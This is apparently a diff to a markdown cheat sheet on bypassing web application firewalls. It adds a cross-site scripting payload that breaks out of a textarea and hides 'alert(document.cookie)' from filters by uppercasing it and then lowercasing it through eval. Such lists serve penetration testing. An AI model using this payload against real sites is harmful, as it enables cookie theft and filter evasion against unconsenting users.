@@ -333,6 +333,12 @@ Here’s a list of 7 useful techniques on how we can bypass WAF (Web Application
 
 GET /?q=xss     POST /q=xss
 
+8. Try capatalizing alert function:
+
+```
+</textarea><img src=x onerror=”var pop=’ALERT(document.cookie);’; eval(pop.toLowerCase());”
+```
+
 ### Short XSS Payload:
 
 ```
